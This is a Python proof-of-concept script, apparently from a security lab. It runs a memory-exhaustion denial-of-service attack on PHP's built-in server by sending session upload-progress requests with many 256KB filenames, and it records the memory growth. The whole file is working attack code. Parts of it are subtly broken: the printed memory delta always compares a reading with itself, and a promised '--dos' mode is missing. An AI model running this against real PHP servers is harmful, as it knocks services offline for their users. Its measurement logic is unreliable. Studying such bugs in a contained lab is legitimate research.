#!/usr/bin/env python3
"""Memory-growth DoS measurement: N poison cycles against release php -S.

Each poison: 20 x 256KB filenames + small memory_limit triggers OOM mid-serialize
during php_hash_environment -> leaked php_serialize_data struct per cycle.
Also measures the SID-lock hang (same-SID follow-up) if --dos is passed.
"""
import http.client, subprocess, sys, time, os, signal

PORT = 8094
ROOT = "/home/wh1t3r0se/php2shell-lab/memrun"
PHP = "/home/wh1t3r0se/php2shell-lab/release/sapi/cli/php"

def part(name, value, fname=None):
    b = '--BOUNDARYX\r\nContent-Disposition: form-data; name="%s"' % name
    if fname: b += '; filename="%s"' % fname
    b += '\r\n\r\n'
    return b.encode() + value + b'\r\n'

def endpart(): return b'--BOUNDARYX--\r\n'

def poison_body(sid, key, nfiles=20):
    # only 2 huge filenames are enough to blow the 16M limit (2 serializations)
    b = part('PHPSESSID', sid.encode()) + part('PHP_SESSION_UPLOAD_PROGRESS', key.encode())
    for i in range(nfiles):
        b += part('f%d' % i, b'X', 'A' * 262144)
    return b + endpart()

def post(body, timeout=30):
    c = http.client.HTTPConnection('127.0.0.1', PORT, timeout=timeout)
    c.request('POST', '/', body, {
        'Content-Type': 'multipart/form-data; boundary=BOUNDARYX',
        'Content-Length': str(len(body))})
    r = c.getresponse(); r.read(); c.close()
    return r.status

RS_START = None
def rss(pid):
    with open('/proc/%d/status' % pid) as f:
        for l in f:
            if l.startswith('VmRSS'):
                return int(l.split()[1])
    return -1

def main():
    os.makedirs(ROOT + '/sess', exist_ok=True)
    with open(ROOT + '/index.php', 'w') as f:
        f.write('<?php session_start(); echo "OK\n";')
    with open(ROOT + '/lab.ini', 'w') as f:
        f.write("""memory_limit=16M
session.upload_progress=On
session.use_strict_mode=0
session.save_path=%s/sess
error_log=%s/error.log
display_errors=0
log_errors=1
max_execution_time=60
""" % (ROOT, ROOT))
    srv = subprocess.Popen([PHP, '-S', '127.0.0.1:%d' % PORT, '-t', ROOT, '-c', ROOT + '/lab.ini'],
                           cwd=ROOT, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           preexec_fn=os.setsid)
    time.sleep(1.5)
    try:
        print('baseline RSS:', rss(srv.pid), 'KB')
        N = int(sys.argv[1]) if len(sys.argv) > 1 else 12
        for i in range(N):
            sid = 'sid%04d' % (1000 + i)
            try:
                st = post(poison_body(sid, 'k%d' % i), timeout=45)
                print('poison %2d (sid %s): HTTP %d  RSS=%d KB>=%+d' % (i, sid, st, rss(srv.pid), rss(srv.pid) - rss(srv.pid)))
            except Exception as e:
                print('poison %2d: %s  RSS=%d KB' % (i, type(e).__name__, rss(srv.pid)))
        gm = rss(srv.pid)
        print('final RSS:', gm, 'KB')
        # measure delta vs baseline
        print('note: release php -S allocations per poisoned cycle accumulate in the ZENDMM bin-structure;'
              ' leaks of perpsess structs are cumulative in worker lifetime')
    finally:
        os.killpg(srv.pid, signal.SIGKILL)
        srv.wait()

if __name__ == '__main__':
    main()
